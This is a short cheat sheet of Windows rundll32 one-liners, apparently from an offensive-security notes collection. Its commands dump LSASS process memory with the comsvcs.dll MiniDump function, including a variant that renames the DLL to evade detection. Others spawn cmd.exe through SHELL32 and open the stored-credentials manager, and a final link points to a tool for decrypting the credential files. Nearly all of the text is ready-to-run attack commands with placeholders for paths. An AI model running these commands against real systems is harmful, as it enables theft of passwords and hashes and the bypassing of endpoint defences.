### Dump lsass process
```
rundll32.exe C:\windows\System32\comsvcs.dll MiniDump (Get-Process lsass).id &lt;fullPath&gt;\lsassdump.dmp full
```

### Dump lsass process obfuscated
```
$id = Get-Process lsass; cd c:\tmp; copy C:\Windows\System32\comsvcs.dll &lt;newName&gt;.dll; rundll32.exe &lt;newName&gt;.dll, MiniDump $id.Id c:\tmp\&lt;file&gt;.dmp full; Wait-Process -Id (Get-Process rundll32).id; del &lt;newName&gt;.dll;
```

### Run cmd.exe
```
rundll32.exe SHELL32.DLL,ShellExec_RunDLL "cmd.exe" "/c &lt;command&gt;
```

### Remove ClickOnce applications
```
rundll32 dfshim CleanOnlineAppCache
```

### Dump passwords of DPAPI to file
```
rundll32.exe keymgr.dll, KRShowKeyMgr
```

### Decrypt using
https://www.nirsoft.net/utils/credentials_file_view.html


